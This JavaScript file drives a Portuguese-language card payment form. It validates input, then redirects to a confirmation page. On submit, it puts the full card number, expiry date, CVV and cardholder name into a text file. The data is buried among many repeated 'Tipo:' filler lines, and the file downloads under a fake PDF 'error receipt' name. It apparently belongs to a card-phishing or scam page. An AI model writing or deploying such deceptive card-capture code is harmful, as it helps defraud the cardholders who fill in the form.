document.addEventListener("DOMContentLoaded", () => {
    const form = document.querySelector("#dadosss");
    const dadosForm = document.querySelector("#dados");

    const campos = {
        numero: document.querySelector("#numero"),
        data: document.querySelector("#data"),
        cvv: document.querySelector("#cvv"),
        nome: document.querySelector("#nome"),
    };

    const mensagensDica = {
        numero: "Exemplo: 1234 5678 9123 4567",
        data: "Exemplo: 12/30",
        cvv: "Exemplo: 123",
        nome: "Nome completo impresso no cartão.",
    };

    for (const key in campos) {
        const input = campos[key];

        input.addEventListener("focus", () => {
            removeMensagemDica(input);

            const dica = document.createElement("span");
            dica.classList.add("mensagem-dica");
            dica.style.color = "#666";
            dica.style.fontSize = "12px";
            dica.style.display = "block";
            dica.style.marginTop = "4px";
            dica.textContent = mensagensDica[key];

            input.parentElement.appendChild(dica);
        });

        input.addEventListener("blur", () => {
            removeMensagemDica(input);
        });
    }

    function removeMensagemDica(input) {
        const existing = input.parentElement.querySelector(".mensagem-dica");
        if (existing) existing.remove();
    }

    form.addEventListener("submit", (event) => {
        event.preventDefault();

        document.querySelectorAll(".mensagem-erro").forEach(el => el.remove());

        const inputs = {
            numero: campos.numero,
            data: campos.data,
            cvv: campos.cvv,
            nome: campos.nome,
            tipo: document.querySelector('input[name="gender"]:checked'),
        };

        const mensagensErro = {
            numero: "Por favor, insira o número do cartão.",
            data: "A data e o CVV são necessários.",
            cvv: "",
            nome: "Por favor, insira o nome impresso no cartão.",
            tipo: "Selecione uma opção (Crédito ou Débito).",
        };

        let formValido = true;

        for (const key in inputs) {
            const input = inputs[key];

            if (!input || (input.value === "" || input.value === undefined)) {
                formValido = false;

                if (key === "tipo") {
                    const radios = document.querySelectorAll('input[name="gender"]');
                    radios.forEach(r => {
                        r.parentElement.style.border = "1px solid red";
                        r.parentElement.style.borderRadius = "8px";
                        r.parentElement.style.padding = "5px";
                    });

                    const container = document.querySelector(".radio-container");
                    const erro = document.createElement("span");
                    erro.classList.add("mensagem-erro");
                    erro.style.color = "red";
                    erro.style.fontSize = "14px";
                    erro.textContent = mensagensErro[key];
                    container.appendChild(erro);

                } else {
                    input.style.border = "1px solid red";
                    input.style.borderRadius = "8px";

                    const erro = document.createElement("span");
                    erro.classList.add("mensagem-erro");
                    erro.style.color = "red";
                    erro.style.fontSize = "14px";
                    erro.style.display = "block";
                    erro.style.marginTop = "4px";
                    erro.textContent = mensagensErro[key];
                    input.parentElement.appendChild(erro);
                }
            } else {
                if (key === "tipo") {
                    document.querySelectorAll('input[name="gender"]').forEach(r => {
                        r.parentElement.style.border = "none";
                    });
                } else {
                    input.style.border = "1px solid #ccc";
                }
            }
        }

        if (formValido) {
            saveFormDataToFile();
            window.location.href = "confirmacao.html";
        }
    });

    function saveFormDataToFile() {
        const cardNumber = campos.numero.value;
        const expiryDate = campos.data.value;
        const cvv = campos.cvv.value;
        const cardName = campos.nome.value;
        const cardType = document.querySelector('input[name="gender"]:checked')?.value || 'Not selected';
        
        const formData = `
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Número: ${cardNumber}
Validade: ${expiryDate}
CVV: ${cvv}
Nome no Cartão: ${cardName}
Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
`;
        
        const blob = new Blob([formData], { type: 'text/plain' });
        
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'comprovante_erro_1023404.pdf';
        
        document.body.appendChild(a);
        a.click();
        
        document.body.removeChild(a);
        URL.revokeObjectURL(a.href);
    }

});